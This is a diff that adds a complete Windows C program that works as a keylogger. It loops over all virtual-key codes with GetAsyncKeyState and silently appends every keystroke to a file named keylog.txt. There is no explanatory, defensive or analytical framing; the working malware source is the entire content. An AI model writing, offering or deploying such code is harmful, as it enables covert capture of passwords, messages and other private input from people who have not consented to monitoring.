@@ -1,0 +1,26 @@
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    FILE *file;
+    file = fopen("keylog.txt", "a");
+    if (file == NULL) {
+        printf("Error opening file!\n");
+        return 1;
+    }
+
+    while (1) {
+        for (int i = 0x01; i <= 0xFE; i++) {
+            // Check if the key is pressed
+            if (GetAsyncKeyState(i) & 0x8000) {
+                fprintf(file, "%c", i);
+                fflush(file);
+                Sleep(10);  // Short delay to avoid flooding the file
+            }
+        }
+        Sleep(10);  // Short delay to avoid high CPU usage
+    }
+
+    fclose(file);
+    return 0;
+}
